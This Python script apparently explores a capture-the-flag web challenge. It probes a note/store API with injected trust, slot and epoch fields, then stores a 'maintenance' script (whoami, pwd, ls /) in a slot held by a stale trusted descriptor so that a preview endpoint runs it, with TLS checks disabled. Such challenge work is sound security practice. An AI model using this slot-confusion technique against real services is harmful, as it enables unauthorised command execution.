#!/usr/bin/env python3
"""Orphaned Context — understand note/store + preview-reads-slot-occupant.
Preview returns {trusted, format, preview} and reads the descriptor's SLOT content.
Plan to learn:
 1. note/store schema (needs 'text'; what else: slot? trust?).
 2. does preview of a descriptor whose slot now holds a NOTE render the note?
 3. the trust/epoch relationship (orphaned descriptor = trusted handle over an
    untrusted note's slot => script executes).
"""
import json, base64
import requests, urllib3
urllib3.disable_warnings()
B="https://orphaned-context-c18229f45f48.chall.hiddeninvestigations.net"
s=requests.Session(); s.verify=False
s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Accept":"application/json"})
def post(p, body): r=s.post(B+p, json=body, timeout=15); return r.status_code, r.text.strip()
def get(p): r=s.get(B+p, timeout=15); return r.status_code, r.text.strip()
def jd(t):
    try: return json.loads(t)
    except: return {}

# status before
print("status:", get("/api/relay/status")[1][:400])

# 1) note/store schema discovery
print("\n=== note/store schema ===")
for body in [{"text":"hello"},
             {"text":"#!relay-maint/1\nhelp\n"},
             {"text":"hi","slot":2},
             {"text":"hi","trust":"trusted"},
             {"text":"hi","epoch":1}]:
    print(f"  {json.dumps(body)[:50]:50} ->", post("/api/note/store", body))

# 2) open a capture, note its slot/epoch; store a note (maint script); preview descriptor
print("\n=== chain: open -> store note in same slot -> preview ===")
c,t=post("/api/capture/open", {"incident":"IR-7731"})
o=jd(t); desc=o.get("recovery_descriptor"); slot=o.get("slot"); epoch=o.get("epoch")
print("  open:", o.get("request_id"), "slot", slot, "epoch", epoch)
print("  desc payload:", json.loads(base64.urlsafe_b64decode(desc.split('.')[0]+"==")) if desc else None)

# store a maintenance note (try to land in the SAME slot)
script="#!relay-maint/1\nhelp\nwhoami\npwd\nls /\n"
for body in [{"text":script,"slot":slot},{"text":script}]:
    print("  note/store:", post("/api/note/store", body))

print("  status after:", get("/api/relay/status")[1][:400])

# now preview with the capture descriptor (its slot may now hold the note)
print("  preview(desc):", post("/api/recover/preview", {"recovery_descriptor":desc,"script":script}))
print("  preview(desc) no-script:", post("/api/recover/preview", {"recovery_descriptor":desc}))
